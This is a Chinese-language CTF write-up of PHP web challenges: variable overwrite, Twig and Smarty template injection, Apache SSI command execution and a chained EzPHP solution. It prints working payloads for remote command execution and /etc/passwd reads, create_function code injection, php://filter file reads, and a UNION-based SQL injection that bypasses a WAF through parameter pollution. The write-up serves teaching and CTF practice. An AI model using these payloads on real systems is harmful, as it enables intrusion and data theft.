##  Mark loves cat

###  考点

GitHack泄露，`$$`变量覆盖

[变量覆盖的介绍](https://www.mi1k7ea.com/2019/06/20/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/)

###  wp

利用GitHack获取源码

index.php

```php
<?php

include 'flag.php';

$yds = "dog";
$is = "cat";
$handsome = 'yds';

foreach($_POST as $x => $y){
    $$x = $y;
}

foreach($_GET as $x => $y){
    $$x = $$y;
}

foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}
//存在两个flag
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
//flag不等于flag
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
echo "the flag is: ".$flag;
```

flag.php

```
<?php
$flag = file_get_contents('/flag');
```

```
foreach($_GET as $x => $y){
    if($_GET['flag'] === $x && $x !== 'flag'){
        exit($handsome);
    }
}
```

这段代码，基本没法实现。加上又是`===`强类型比较

#### 方法1

利用

```
if(!isset($_GET['flag']) && !isset($_POST['flag'])){
    exit($yds);
}
```

只需要满足没有flag传值就行。

payload

```
/?yds=flag
```

#### 方法2

```php
if($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){
    exit($is);
}
```

满足有flag传值

payload

```
/?flag=flag&is=flag
```

## Cookie is so stable

### 考点：

Twig模板注入

###  Twig模板注入

https://github.com/unexpectedzzy/Web-Security/tree/main/SSTI/twig

###  wp

测试了一下是twig模板注入，直接使用模板

```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /etc/passwd")}}
```

![image-20220308220421898](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203082204032.png)

然后直接`cat /flag`

## The mystery of ip

###  考点：

smarty的模板注入

###  wp

`flag.php`中显示ip地址，可能就想到了利用`xff`和`client_ip`两个header标签。尝试了一下`127.0.0.1`,不成功。`<script>alert("1")</script>`，xss也不成功。

试一下`SSTI`,成功了。看到回显是php，所以肯定不是flask。

最后确定`smarty`的模板注入

payload：

`X-Forwarded-For: {if phpinfo()}{/if}`

![image-20220308164154209](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203081642530.png)



读取flag

![image-20220308164320887](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203081643181.png)



###  smarty的模板学习

https://github.com/unexpectedzzy/Web-Security/tree/main/SSTI/smarty

##  对模板注入的判别

```
https://cloud.tencent.com/developer/article/1516336

https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84
```

https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/#1-php-%E5%B8%B8%E7%94%A8%E7%9A%84

##  EasySearch

###  考点

由`shtml`得知是Apache SSI远程命令执行

看到题目，试探性的扫描一波，看到后台swp文件泄露

访问`/index.php.swp`

得到源码

```
<?php
	ob_start();
	function get_hash(){
		$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';
		$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times
		$content = uniqid().$random;
		return sha1($content); 
	}
    header("Content-Type: text/html;charset=utf-8");
	***
    if(isset($_POST['username']) and $_POST['username'] != '' )
    {
        $admin = '6d0bc1';
        if ( $admin == substr(md5($_POST['password']),0,6)) {
            echo "<script>alert('[+] Welcome to manage system')</script>";
            $file_shtml = "public/".get_hash().".shtml";
            $shtml = fopen($file_shtml, "w") or die("Unable to open file!");
            $text = '
            ***
            ***
            <h1>Hello,'.$_POST['username'].'</h1>
            ***
			***';
            fwrite($shtml,$text);
            fclose($shtml);
            ***
			echo "[!] Header  error ...";
        } else {
            echo "<script>alert('[!] Failed')</script>";
            
    }else
    {
	***
    }
	***
?>

```

比较简单的代码，需要满足password的md5值的前六位要等于6d0bc1

直接写脚本

```python
import hashlib
 
for i in range(1000000000):
    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()
 
    if a[0:6] == '6d0bc1':
        print(i)
        print(a)
```

随便登陆一下

![image-20220308234010421](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203082340564.png)

看到返回了内容写进去的文件路径

有个`shtml`,想到Apache SSI 远程命令执行漏洞，参考https://cloud.tencent.com/developer/article/1540513



直接命令执行

```
<!--#exec cmd="ls ../" -->
```

![image-20220308234214349](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203082342488.png)

查flag也是一样的

## EzPHP

###  考点

1. 绕过QUERY_STRING的正则匹配
2. 绕过preg_match
3. 绕过$_REQUEST的字母匹配
4. file_get_contents绕过
5. sha1强比较绕过
6. create_function()注入

###  wp

###  1.主页

F12,有个编码，但是不是`base64`,是`base32`，这个比较少见了。

![image-20220308191015591](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203081910687.png)



解码后直接访问URL`/1nD3x.php`

得到代码，好多过滤，确实有点麻

```
 <?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?>
This is a very simple challenge and if you solve it I will give you a flag. Good Luck!
fxck you! I hate English!
```

一步一步来绕过

####  2. 绕过$_SERVER['QUERY_STRING']

```
if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}
```

对URL的解析

>url: [http](https://so.csdn.net/so/search?q=http&spm=1001.2101.3001.7020)://127.0.0.1/aaa/index.php?m=222&n=333
>
>\$\_SERVER[‘QUERY_STRING’] = “m=222&n=333”;
>$\_SERVER[‘REQUEST_URI’] = “/aaa/index.php?m=222&n=333”;
>$\_SERVER[‘SCRIPT_NAME’] = “/aaa/index.php”;
>$\_SERVER[‘PHP_SELF’] = “/aaa/index.php”;

绕过利用点：

`$_SERVER['QUERY_STRING']`在读取url时并不会对url进行[解码](https://so.csdn.net/so/search?q=解码&spm=1001.2101.3001.7020)，而`$_GET['x']`是会自动进行url解码的，所以我们要把可能出现在黑名单的字符串进行url编码后再传入，就可以绕过。

### 3.绕过preg_match

#### 常见绕过preg_match的方法

>1.%0A绕过
>类似于`preg_match("/^.*flag.*$/",$cmd)`这种的[正则匹配](https://so.csdn.net/so/search?q=正则匹配&spm=1001.2101.3001.7020)，默认只匹配第一行
>`?cmd=%0acat flag`即可绕过
>
>2.PCRE回溯次数限制绕过
>当正则匹配回溯次数超过上限时将返回false
>
>3.数组绕过
>preg_match只能处理字符串，当传入的是数组时将会返回false。

```
if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');
```

这儿首先对`file`的值判断，不能有`http`和`https`

`preg_match('/^aqua_is_cute$/', $_GET['debu'])`要求debu的值满足正则`/^aqua_is_cute$/`，`^和$`用来表示开头和结尾
`$_GET['debu'] !== 'aqua_is_cute'`要求debu的值不能强等于`'aqua_is_cute'`。



所以这儿，我们采用换行符`%0a`绕过就可以了。构造

```
deb%75=aq%75a_is_c%75te%0a
```

### 4.绕过$_REQUEST的字母匹配

```
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 
```

`$_REQUEST`包括所有以cookie,post或者get方式传入的变量，如果含有字母则无法通过，但我们所有的参数构造都离不开字母。

一个`$_REQUEST`特性，优先级：cookie>post>get

所以get传入变量后，再用post方式传入数字值进行覆盖即可。

#### $_REQUEST的一些小特性

##### $_REQUEST使用不当绕过WAF

php手册上面对于`$_REQUEST`的说法是:

> 由于 $_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件，因此可以被远程用户篡改而并不可信

`$_REQUEST`是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续`GET，POST 和 COOKIE`发生了变化，也不会影响`$_REQUEST`的结果。如下:

```php
foreach ($_REQUEST as $key=>$value) {
    $_REQUEST[$key] = md5($value);
}
var_dump($_REQUEST);
var_dump($_GET);
```

![image-20220308194357161](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203081943233.png)

可以看到`$_REQUEST`的结果发生了改变，但是`$_GET`的结果并没有改变

#####  漏洞代码

代码显示

```
foreach ($_REQUEST as $key=>$value) {
    $_REQUEST[$key] = waf($value);
}
if(isset($_POST['submit'])) {
    $id = $_POST['id'];
    $sql = "select * from user where id=$id";
    mysql_query($sql);
    //....
}

```

虽然使用了`waf`进行过滤，但是waf过滤的是`$_REQUEST`，在业务代码中使用的是`$_POST`。这样就导致前面的WAF过滤没有任何的作用，防护完全失效。

##### $_REQUEST导致的HPP漏洞

1.php自身在解析请求的时候，如果参数名字中包含空格、`.`、`[`这几个字符，会将他们转换成`_`。测试如下:

![image-20220308195318034](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203081953124.png)



2.php在遇到相同参数时接受的是第二个参数。

这个就不用测试了。

3.通过`$_SERVER['REQUEST_URI']`方式获得的参数并不会进行转换

代码

```
<?php
$request_url=explode("?",$_SERVER['REQUEST_URI']);
var_dump($request_url);
```

![image-20220308195655064](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203081956152.png)

#####  漏洞代码

```php
<?php
function dhtmlspecialchars($string) {
    if (is_array($string)) {
        foreach ($string as $key => $val) {
            $string[$key] = dhtmlspecialchars($val);
        }
    }
    else {
        $string = str_replace(array('&', '"', '<', '>', '(', ')'), array('&', '"', '<', '>', '（', '）'), $string);
        if (strpos($string, '&#') !== false) {
            $string = preg_replace('/&((#(\d{3,5}|x[a-fA-F0-9]{4}));)/', '&\\1', $string);
        }
    }
    return $string;
}
function dowith_sql($str) {
    $check = preg_match('/select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile/is', $str);
    if ($check) {
        echo "非法字符!";
        exit();
    }
    return $str;
}
// 经过第一个waf处理
foreach ($_REQUEST as $key => $value) {
    $_REQUEST[$key] = dowith_sql($value);
}
// 经过第二个WAF处理
$request_uri = explode("?", $_SERVER['REQUEST_URI']);
var_dump($request_uri);
if (isset($request_uri[1])) {
    $rewrite_url = explode("&", $request_uri[1]);
    foreach ($rewrite_url as $key => $value) {
        $_value = explode("=", $value);
        if (isset($_value[1])) {
            $_REQUEST[$_value[0]] = dhtmlspecialchars(addslashes($_value[1]));
        }
    }
}
// 业务处理
if (isset($_REQUEST['submit'])) {
    $user_id = $_REQUEST['user_id'];
    $sql = "select * from users where id=$user_id";
    var_dump($sql);
}

```

1. 第一个WAF，采用了`dowith_sql()`函数，如果`$_REQUEST`存在`select|insert|update|delete`等敏感关键字或者是字符，则直接exit()。如果不存在，则原字符串返回。我们利用传两个相同参数来绕过。
2. 第二个WAF，通过`$_SERVER['REQUEST_URI']`得到请求参数，之后利用`explode("&", $request_uri[1])`得到每个参数，包括参数名和参数值。对每个参数值采用`dhtmlspecialchars()`过滤，对字符`& " < > ( )`都进行了替换。替换完毕之后重新得到`_REQUEST`。
3. 在最后的业务处理中，通过`$_REQUEST`获取参数进行处理。

如果能够利用HPP漏洞的原理，在WAF对参数进行过滤时处理的是一个参数，但是在进入到业务中处理的是第二个参数，那么我们就能够绕过WAF了。用一个简单的例子进行说明：

```
// test.php
var_dump($_REQUEST);
$request_uri = explode("?", $_SERVER['REQUEST_URI']);
if (isset($request_uri[1])) {
    $rewrite_url = explode("&", $request_uri[1]);
    foreach ($rewrite_url as $key => $value) {
        $_value = explode("=", $value);
        if (isset($_value[1])) {
            $_REQUEST[$_value[0]] = addslashes($_value[1]);
        }
    }
}
var_dump($_REQUEST);
复制代码
```



我们访问URL是：`test.php?submit=&user_id=select&user.id=123`。得到的结果如下：


![image-20220308202149028](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203082021137.png)



第一次输出`$_REQUEST`仅仅只会输出`user_id=123`。因为php会将`user.id`替换为`user_id`，此时出现了两个`user_id`，而根据php的原则，则会选取第二个参数，所以第一次输出仅仅只会有`user_id=123`，从而绕过第一个waf。

第二次输出`$_REQUEST`会输出`user_id=select&user.id=123`是因为`$_SERVER['REQUEST_URI']`并不会对特殊的符号进行替换，因此所有的参数均不会变化，所有的参数都会原样输出。

按照以上的两种特性，我们利用参数污染的方法，是第一个WAF在处理时处理的是正常请求参数的URL，第二个WAF即使处理的是带有payload的参数，但是因为`dhtmlspecialchars()`的方法很容易被绕过，最终我们的payload就会进入到正常的业务请求中。用一个图来说明这个问题。

![img](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203082022843.webp)

1. 我们请求参数是`user_id=payload&user.id=123`
2. 在经过第一个WAF时，由于`$_REQUEST`会将参数中的`>`替换为`_`，所以会得到两个`user_id`变为了`user_id=payload&user_id=123`。按照PHP的特性遇到相同的参数去第二个参数,所以第一个WAF取的是`user_id=123`，此时正常地通过第一个WAF。
3. 进入到第二个WAF时，由于是通过`$_SERVER['REQUEST_URI']`取参数，`user.id`参数并不会被替换为`user_id`，所以两个参数都会第二个经过`WAF`
4. 我们的payload绕过了第二个WAF之后(比较容易绕过)，`user_id=payload&user.id=123`进入到业务请求中执行SQL语句，导致SQL注入。

payload

```
submit=&user_id=1/**/union/**/select/**/1,2,3&user.id=123
```

![image-20220308202459141](https://z3eyond-top-1304266053.cos.ap-chengdu.myqcloud.com/typora/202203082024249.png)

绕过成功。

### 5. file_get_contents绕过

```
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>"); 

```

`file_get_contents`可以读取文件内容，但是我们无法在服务器本地找到内容为`'debu_debu_aqua'`的文件进行读取，而上一部分又过滤了`http`和`https`等协议，也无法进行`远程包含`，这里考虑使用data协议绕过，记得要编码绕过黑名单。

```
file=data://text/plain,deb%75_deb%75_aq%75a
```

#### 常见的绕过方式

代码就是上面的代码

绕过：

> 使用php://input伪协议绕过:
> ① 将要GET的参数?xxx=php://input
> ② 用post方法传入想要file_get_contents()函数返回的值
>
> 用data://伪协议绕过
> 将url改为：?xxx=data://text/plain;base64,想要file_get_contents()函数返回的值的base64编码。
>
> data://资源类型;编码，内容
>
> 用远程包含
>
> 直接赋值给远程的服务器ip地址。

data://

```
data:,<文本数据>
data:text/plain,<文本数据>
data:text/html,<HTML代码>
data:text/html;base64,<base64编码的HTML代码>
data:text/css,<CSS代码>
data:text/css;base64,<base64编码的CSS代码>
data:text/javascript,<Javascript代码>
data:text/javascript;base64,<base64编码的Javascript代码>
data:image/gif;base64,base64编码的gif图片数据
data:image/png;base64,base64编码的png图片数据
data:image/jpeg;base64,base64编码的jpeg图片数据
data:image/x-icon;base64,base64编码的icon图片数据
```

### 6.sha1强比较绕过

```
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
} 

```

很常见的强比较，类似与md5，主要有两种方法，数组绕过和强碰撞。这儿利用数组

```
sh%61na[]=1&p%61sswd[]=2
```

### 7.create_function()注入

```
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); //此处存在create_function()注入
} ?>
```

create_function()注入原理：

create_function()函数有两个参数$args和$code，用于创建一个lambda样式的函数，首先可以用create_function()创建一个简单函数

```php
<?php
$afunc = create_function('$a, $b','return ($a+$b);');
echo $afunc(1,2);
//输出3
?
```

以上的函数等价于

```php
<?php
function func($a,$b)
{
	return $a+$b;
}
echo func(1,2);
//输出3
```

但由于$code参数可控，可能会存在代码注入

```php
<?php
$Func = create_function('$a, $b', 'return($a+$b);}eval($_POST['cmd']);//');

function Func($a, $b)
{
	return $a+$b;
}
eval($_POST['cmd']);//}
?>
```

而本题的`$code('', $arg)`; //此处存在create_function()注入中可以通过控制`$arg`来进行代码注入
首先保证传入的`$code`为`create_funtion`，
其次是`$arg`参数，本题中过滤了`cat、flag、scan`等关键字，无法直接命令执行得到flag的值，在网上查阅后找到了合适的函数`get_defined_vars()`直接输出所有变量，构造payload如下

```
fl%61g[c%6fde]=create_function&fl%61g[%61rg]=}var_dump(get_defined_vars());//
```

###  8.出flag

完整payload

```
GET:
?deb%75=aq%75a_is_c%75te%0a
&file=data://text/plain,deb%75_deb%75_aq%75a
&sh%61na[]=1
&p%61sswd[]=2
&fl%61g[c%6fde]=create_function
&fl%61g[%61rg]=}var_dump(get_defined_vars());//

POST:
debu=1&file=1
```

拿到rea1fl4g.php，我们需要尝试打开文件

可以继续使用`get_defined_vars()`，但前提是必须包含这个文件。
但在**Part 7**的黑名单中屏蔽了`inc`故无法使用`include`，我们可用`require`代替。黑名单还屏蔽了点号，故文件名无法直接输入，可以使用base64将文件名编码绕过。

修改payload：

```
fl%61g[c%6fde]=create_function
&fl%61g[%61rg]=}require(base64_dec%6fde(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());//
//%6c为url编码的o，为了绕过黑名单
```

看到["f4ke_flag"]=> string(28) "BJD{1am_a_fake_f41111g23333}" }，但是这是错误的

还需要继续读取文件，利用php://filter

```
require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php);
```

为了绕过过滤，用取反操作

```
<?php
$a="php://filter/read=convert.base64-encode/resource=rea1fl4g.php";

echo urlencode(~$a);
?>
//%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F

```

```
fl%61g[%61rg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//
```

最后得到flag，开始解码，得flag



```
?deb%75=aq%75a_is_c%75te%0a
&file=data://text/plain,deb%75_deb%75_aq%75a
&sh%61na[]=1
&p%61sswd[]=2
&fl%61g[c%6fde]=create_function
&fl%61g[%61rg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//
```

但是思路是这样的，我没有出flag。